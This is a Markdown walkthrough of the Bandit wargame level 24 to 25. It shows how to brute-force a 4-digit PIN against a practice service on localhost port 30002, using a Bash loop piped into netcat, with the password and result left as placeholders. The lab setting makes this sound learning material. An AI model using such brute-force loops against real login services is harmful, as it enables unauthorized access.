# Bandit Level 24 → Level 25

## Objective

The service is running on port `30002`.

We need to find the 4-digit PIN and use it together with the `bandit24` password to get the password for `bandit25`.

## Step 1 — Check the current user

```bash
whoami
```

Expected:

```text
bandit24
```

## Step 2 — Test the service

```bash
nc localhost 30002
```

It asks for:

```text
the password for user bandit24 and the secret pincode
```

Exit with:

```text
Ctrl+C
```

## Step 3 — Generate all possible PINs

There are 10,000 possible 4-digit PINs:

```text
0000
0001
0002
...
9999
```

Use a Bash loop:

```bash
for i in {0000..9999}; do
    echo "YOUR_BANDIT24_PASSWORD $i"
done | nc localhost 30002
```

Replace:

```text
YOUR_BANDIT24_PASSWORD
```

with the password you obtained from Level 24.

## Step 4 — Hide the wrong attempts

A cleaner command is:

```bash
for i in {0000..9999}; do
    echo "YOUR_BANDIT24_PASSWORD $i"
done | nc localhost 30002 | grep -v "Wrong"
```

## Result

The correct PIN will produce something similar to:

```text
Correct!
The password of user bandit25 is XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

Copy that password.

That is the password for:

```text
bandit25
```

## Commands Used

```bash
whoami
nc localhost 30002

for i in {0000..9999}; do
    echo "YOUR_BANDIT24_PASSWORD $i"
done | nc localhost 30002 | grep -v "Wrong"
```

## What I Learned

```text
Bash for loop
        ↓
Generate 0000–9999
        ↓
Send each password + PIN to port 30002
        ↓
Server checks each attempt
        ↓
Correct PIN
        ↓
Receive bandit25 password
```
